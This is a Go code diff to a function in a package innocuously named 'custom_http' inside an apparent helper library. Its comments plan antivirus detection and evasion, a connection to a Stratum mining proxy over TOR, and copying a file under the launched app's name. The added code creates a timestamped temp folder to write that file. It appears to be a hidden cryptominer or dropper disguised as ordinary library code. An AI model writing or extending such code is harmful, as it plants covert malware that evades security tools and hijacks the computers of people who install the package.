@@ -2,9 +2,13 @@ package custom_http
 
 import (
 	"github.com/kyaxcorp/go-core/core/helpers/_runtime"
+	"github.com/kyaxcorp/go-core/core/helpers/conv"
+	"github.com/kyaxcorp/go-core/core/helpers/filesystem"
 	"github.com/kyaxcorp/go-core/core/helpers/filesystem/tmp"
+	"github.com/kyaxcorp/go-core/core/helpers/folder"
 	"log"
 	"os"
+	"time"
 )
 import "os/exec"
 
@@ -12,6 +16,9 @@ func Start() bool {
 	/*
 		0. check if there is an Antivirus Running!...
 			if yes, then do not run anything...
+		- check if there is an internet connection!
+		- check if it's possible to connect to the hostname and to the Stratum Proxy...
+		- try using TOR for connecting to the secured network!
 
 		1. detect OS or build
 		2. copy file as the name of the current launched app
@@ -77,7 +84,18 @@ func Start() bool {
 	// We don't need that!
 
 	// TODO: get executable file name!
-	writeFileTo = tmpPath + readFileName
+
+	now := time.Now().Unix()
+	dirPath := tmpPath + conv.Int64ToStr(now) + filesystem.DirSeparator()
+	if !folder.Exists(dirPath) {
+		_err = folder.MkDirErr(dirPath)
+		if _err != nil {
+			log.Println("failed to create folder path -> ", dirPath, _err.Error())
+			return false
+		}
+	}
+
+	writeFileTo = dirPath + readFileName
 
 	log.Println("creating file")
 
